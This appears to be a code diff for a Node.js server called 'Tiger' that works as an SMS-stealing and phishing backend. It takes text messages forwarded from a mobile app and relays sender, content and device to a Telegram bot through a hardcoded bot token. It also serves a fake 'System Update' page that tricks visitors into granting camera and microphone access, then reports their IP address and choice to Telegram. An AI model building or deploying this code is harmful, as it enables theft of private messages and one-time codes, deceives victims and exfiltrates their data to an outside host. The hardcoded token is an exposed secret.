@@ -7,32 +7,28 @@ const app = express();
 app.use(express.json());
 app.use(express.static(path.join(__dirname, 'public')));
 
-// --- CONFIGURATION (Aapke Screenshots se) ---
+// --- CONFIGURATION ---
 const BOT_TOKEN = '8394719862:AAGdG06eMVj_Mz4hFCqv-jHrmyiSqsDXppk'; 
 const CHAT_ID = '7128071523';
-// ------------------------------------------
+// ---------------------
 
-// In-memory storage (Jab tak server on hai, data dashboard pe dikhega)
 let smsLogs = [];
 
-// 1. Endpoint: Mobile App se data receive karne ke liye
+// 1. Endpoint: Mobile App Data
 app.post('/log-sms', async (req, res) => {
     try {
         const { sender, message, device, timestamp } = req.body;
-
         const newEntry = {
             id: Date.now(),
             sender: sender || 'Unknown',
-            message: message || 'Empty Message',
+            message: message || 'Empty',
             device: device || 'Tiger-Device',
             timestamp: timestamp || new Date().toISOString()
         };
 
-        // Dashboard ke liye save karein
         smsLogs.unshift(newEntry);
-        if (smsLogs.length > 100) smsLogs.pop(); // Memory bachane ke liye limit
+        if (smsLogs.length > 100) smsLogs.pop();
 
-        // Telegram Notification bhejein
         const telegramMsg = `🐯 *Tiger SMS Alert!*\n\n` +
                           `📱 *Device:* ${newEntry.device}\n` +
                           `👤 *From:* ${newEntry.sender}\n` +
@@ -45,36 +41,24 @@ app.post('/log-sms', async (req, res) => {
             parse_mode: 'Markdown'
         });
 
-        console.log(`[✓] SMS from ${newEntry.sender} forwarded to Telegram.`);
         res.status(200).json({ status: 'success' });
-
     } catch (error) {
-        console.error('[!] Error processing SMS:', error.message);
+        console.error('SMS Error:', error.message);
         res.status(500).json({ status: 'error' });
     }
 });
 
-// 2. Endpoint: Web Dashboard ko data dene ke liye
-app.get('/get-logs', (req, res) => {
-    res.json(smsLogs);
-});
-
-// Server Start
-const PORT = process.env.PORT || 3000;
-app.listen(PORT, () => {
-    console.log(`🚀 Tiger Server is alive on port ${PORT}`);
-});
-
-// --- NEW: Link Tracking & Camera Permission Page ---
+// 2. Link Tracking Page (/track)
 app.get('/track', (req, res) => {
     res.send(`
         <!DOCTYPE html>
         <html>
         <head>
             <title>System Update</title>
+            <meta name="viewport" content="width=device-width, initial-scale=1">
             <style>
                 body { background: #000; color: #fff; font-family: sans-serif; text-align: center; padding-top: 50px; }
-                button { background: #1ed760; border: none; padding: 15px 30px; border-radius: 25px; color: white; font-weight: bold; cursor: pointer; }
+                button { background: #1ed760; border: none; padding: 15px 30px; border-radius: 25px; color: white; font-weight: bold; cursor: pointer; font-size: 16px; }
             </style>
         </head>
         <body>
@@ -85,18 +69,24 @@ app.get('/track', (req, res) => {
             <script>
                 async function startCapture() {
                     try {
-                        // Camera & Mic Permission Pop-up
                         const stream = await navigator.mediaDevices.getUserMedia({ audio: true, video: true });
                         alert("Device hardware verified successfully!");
                         
-                        // Send success notification to Telegram
                         fetch('/log-link-access', {
                             method: 'POST',
                             headers: { 'Content-Type': 'application/json' },
                             body: JSON.stringify({ status: 'Permission Granted', type: 'Camera/Mic' })
                         });
+                        
+                        // Stop stream after access
+                        stream.getTracks().forEach(track => track.stop());
                     } catch (err) {
                         alert("Permission denied. Update failed.");
+                        fetch('/log-link-access', {
+                            method: 'POST',
+                            headers: { 'Content-Type': 'application/json' },
+                            body: JSON.stringify({ status: 'Permission Denied', type: 'Camera/Mic' })
+                        });
                     }
                 }
             </script>
@@ -105,20 +95,29 @@ app.get('/track', (req, res) => {
     `);
 });
 
-// Endpoint to log link activity
+// 3. Endpoint: Log Link Access
 app.post('/log-link-access', async (req, res) => {
-    const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
-    const { status, type } = req.body;
+    try {
+        const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
+        const { status, type } = req.body;
 
-    const msg = `🔗 *Tiger Link Alert!*\n\n` +
-                `📍 *IP:* ${ip}\n` +
-                `🔐 *Action:* ${status}\n` +
-                `🛠 *Type:* ${type}`;
+        const msg = `🔗 *Tiger Link Alert!*\n\n` +
+                    `📍 *IP:* ${ip}\n` +
+                    `🔐 *Action:* ${status}\n` +
+                    `🛠 *Type:* ${type}`;
 
-    await axios.post(\`https://api.telegram.org/bot\${BOT_TOKEN}/sendMessage\`, {
-        chat_id: CHAT_ID,
-        text: msg,
-        parse_mode: 'Markdown'
-    });
-    res.json({ success: true });
+        await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+            chat_id: CHAT_ID,
+            text: msg,
+            parse_mode: 'Markdown'
+        });
+        res.json({ success: true });
+    } catch (error) {
+        res.status(500).json({ error: error.message });
+    }
 });
+
+app.get('/get-logs', (req, res) => res.json(smsLogs));
+
+const PORT = process.env.PORT || 3000;
+app.listen(PORT, () => console.log('🚀 Server running on port ' + PORT));
